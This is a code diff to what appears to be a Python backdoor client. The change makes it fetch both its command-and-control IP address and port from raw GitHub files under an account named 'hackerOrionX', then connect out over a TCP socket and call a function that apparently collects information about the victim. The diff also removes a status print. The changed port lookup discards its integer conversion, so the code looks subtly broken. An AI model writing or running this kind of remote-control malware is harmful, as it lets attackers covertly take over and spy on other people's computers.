@@ -71,8 +71,17 @@ def get_ip(url):
     value = str(data.strip())  
     return value
 
+def get_port(urlport):
+    amongus = urllib.request.urlopen(urlport)
+    data = amongus.read().decode('utf-8')
+    value = str(data.strip())  
+    int(value)
+    return value
+    
+
 
 url = "https://raw.githubusercontent.com/hackerOrionX/test/main/sator"
+urlport = "https://raw.githubusercontent.com/hackerOrionX/test/main/number"
 HOST = '192.168.0.6'
 PORT = 4444
 
@@ -151,9 +160,9 @@ while True:
         try:
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             HOST = get_ip(url)
+            PORT = get_port(urlport)
             print("connect")
             client_socket.connect((HOST, PORT))
-            print("connected")
             getinfos() 
             connected = True
             
